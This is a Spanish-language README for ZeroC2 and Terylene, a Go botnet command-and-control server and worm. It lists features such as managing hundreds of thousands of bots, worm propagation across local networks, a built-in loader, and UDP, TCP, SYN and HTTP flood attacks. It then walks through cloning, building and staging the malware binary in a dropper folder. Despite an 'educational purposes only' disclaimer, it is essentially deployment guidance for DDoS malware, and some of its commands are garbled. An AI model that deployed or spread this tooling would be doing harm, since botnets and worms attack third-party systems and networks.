![pschu]([https://ibb.co/9H0HKW6w](https://i.ibb.co/fdWd6Hf8/Chat-GPT-Image-21-abr-2025-08-25-42.png))

# ADVERTENCIA
**ESTO ES SOLO PARA FINES EDUCATIVOS**

**USAR ESTO PARA ATAQUES DDoS ACTUALES ESTÁ ABSOLUTAMENTE CONDENADO Y PODRÍA RESULTAR EN GRAVES CONSECUENCIAS LEGALES**

## Aún en DESARROLLO

Características de ZeroC2:
```diff
# Monitoreo de latidos dúplex
# Mecanismo de deduplicación de conexión
# Hecho en Golang + ZeroMq
# Capaz de gestionar más de 500k botnets
# Sensor de latidos para rastrear bots
# Migración y transferencia
# Descentralizado
```

Características de Terylene:
```diff
# Latidos dúplex Monitoreo
# Mecanismo de reintento y retroceso
# Mecanismo de prioridad madre
# Hecho en Golang
# Capacidad de escanear y propagarse a través de la red local
# Cargador integrado
# Propagación rápida y concurrente de gusanos
# UDP, TCP, UDPRAPE, UDP modificado, HTTP, inundación SYN
```

Características actualizadas en la versión 0.2.4:

```diff
+ Se solucionó un problema de subproceso de RW
+ Se añadió una función de método personalizado
+ Se añadió una API de servidor web
+ Se optimizó parte del código
+ Se limpió parte del código
```

Próximas características de la versión 0.3.0:
```diff
- Compatibilidad con Docker
- Se limpió mi código base, que estaba dañado por el clúster
- Se añadieron más métodos (por ahora)
```

# [Wiki de ZeroC2](https://github.com/polymaster3313/terylene/wiki/Introduction)

# Configuración basada en Debian
> Ubuntu, Debian, Kali, Parrot OS

### Instalar el paquete ZMQ + GO Usando SNAP
```
sudo apt update
sudo apt upgrade
sudo apt-get install libzmq3-dev
sudo apt install snapd
snap install go --classic
```

# Configuración basada en Arch
> Arch, BlackArch

### Instalar el paquete ZMQ + GO usando pacman

```
sudo pacman -Sy
sudo pacman -S zeromq
sudo pacman -S go
```

# Configuración basada en Red Hat
> CentOS, Rocky, Fedora

### Instalar el paquete ZMQ usando yum

```
sudo yum update
sudo dnf makecache --refresh
sudo yum install -y zeromq-devel
sudo yum install golang
```

#Configuración de ZeroC2 y Terylene

### Clonar el repositorio
```
git clone https://github.com/polymaster3313/terylene.git
```

### Accede a la carpeta
```
cd terylene
```

### Edita las configuraciones en la carpeta config.

```
cd config
nano config.go
```

### Crea terylene y ZeroC2

```
cdserver
sudo go build server.go
cd..
mirai cd
sudo go build -ldflags="-s -w" terylene.go
```

### Descarga el malware terylene en el dropper

```
mv terylene ../server/dropper
```

### Inicia ZeroC2

```
./server
```

>Disfruta ;)

PD: Si se agota el tiempo de espera de la conexión (5 h), Terylene declarará el C2 como inactivo y se activará la **prioridad madre**.

#Madre Prioridad

![madre](https://github.com/polymaster3313/Polyaccess/assets/93959737/197b2d09-8b81-40b6-b73d-e5b14df6c5ff)
